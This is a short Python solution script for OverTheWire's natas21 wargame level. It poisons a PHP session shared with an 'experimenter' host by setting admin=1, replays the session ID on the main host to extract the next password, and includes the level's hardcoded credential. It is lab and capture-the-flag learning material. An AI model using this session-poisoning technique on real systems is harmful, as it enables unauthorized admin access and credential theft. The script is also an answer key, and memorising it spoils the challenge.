import urllib.request, urllib.parse, base64, http.cookiejar, re
# natas21: the experimenter host shares the PHP session store. POST admin=1
# there (its code copies any $_REQUEST key into $_SESSION when "submit" is
# present), then present the SAME PHPSESSID to the main host. urllib's cookie
# jar is host-scoped, so the main-host request must send the Cookie header
# explicitly.
auth = "Basic " + base64.b64encode(b"natas21:7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU").decode()
exp = "http://natas21-experimenter.natas.labs.overthewire.org/"
main = "http://natas21.natas.labs.overthewire.org/"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
# step 1: get a session id from the experimenter
r = urllib.request.Request(exp, headers={"Authorization": auth})
op.open(r, timeout=15).read()
sid = [c.value for c in cj][0]
print("session id:", sid)
# step 2: set admin=1 through the experimenter's form (submit key required)
d = urllib.parse.urlencode({"admin": "1", "submit": "Update"}).encode()
r = urllib.request.Request(exp, data=d, headers={"Authorization": auth})
op.open(r, timeout=15).read()
# step 3: same session id on the main host (explicit Cookie header)
r = urllib.request.Request(main, headers={"Authorization": auth, "Cookie": f"PHPSESSID={sid}"})
body = op.open(r, timeout=15).read().decode("utf-8", "replace")
m = re.search(r"Username: (\w+)<br>Password: (\w+)", body)
print("ADMIN:", m.group(0) if m else body[-200:])

